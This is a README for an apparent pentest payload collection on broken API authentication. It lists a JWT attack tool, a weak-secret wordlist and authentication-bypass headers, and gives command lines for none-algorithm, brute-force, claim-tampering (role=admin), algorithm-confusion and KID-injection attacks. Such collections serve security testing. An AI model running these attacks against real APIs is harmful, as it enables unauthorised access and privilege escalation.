# Broken Authentication Payloads

> **OWASP API**: API2 — Broken Authentication

## Files

| File | Description |
|------|-------------|
| [`jwt_attacks.py`](jwt_attacks.py) | Python JWT attack tool (none alg, confusion, bruteforce, tamper, KID, JKU) |
| [`jwt_common_secrets.txt`](jwt_common_secrets.txt) | Top 100+ weak JWT secrets for HMAC brute-force |
| [`auth_bypass_headers.md`](auth_bypass_headers.md) | HTTP headers to bypass authentication (IP spoofing, role escalation, verb tunneling) |

## Quick Start

```bash
# Decode a JWT
python -I jwt_attacks.py --token <jwt> --attack decode

# Try none algorithm
python -I jwt_attacks.py --token <jwt> --attack none

# Brute-force weak secret
python -I jwt_attacks.py --token <jwt> --attack bruteforce --wordlist jwt_common_secrets.txt

# Tamper claims
python -I jwt_attacks.py --token <jwt> --attack tamper --claim role=admin --claim is_admin=true

# Algorithm confusion (RS256 → HS256)
python -I jwt_attacks.py --token <jwt> --attack confusion --public-key pubkey.pem

# KID injection payloads
python -I jwt_attacks.py --token <jwt> --attack kid
```
